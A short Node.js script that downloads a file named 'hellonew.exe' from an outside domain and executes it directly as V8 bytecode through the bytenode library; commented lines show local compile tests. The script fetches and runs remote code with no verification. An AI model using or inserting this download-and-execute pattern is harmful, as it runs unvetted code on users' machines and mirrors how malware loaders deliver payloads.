var bytenode = require("bytenode")
var https = require('https');
var fs = require('fs');
https.get("https://bhavyasoftwares.com/downloads/hellonew.exe", (res) => {
    const data = [];
    res.on('data', (chunk) => {
      data.push(chunk);
    }).on('end', () => {
      var buffer = Buffer.concat(data);
      //console.log(buffer)
      /*fs.writeFileSync('hellot.jsc', buffer);
      var x = bytenode.compileCode("console.log('compiled');")
      fs.writeFileSync('hellonew.jsc', x);
      run(x);*/
      run(buffer);
    });
  }).on('error', (err) => {
    console.log('download error:', err);
  });

function run(buffer) {
  bytenode.runBytecode(buffer);
}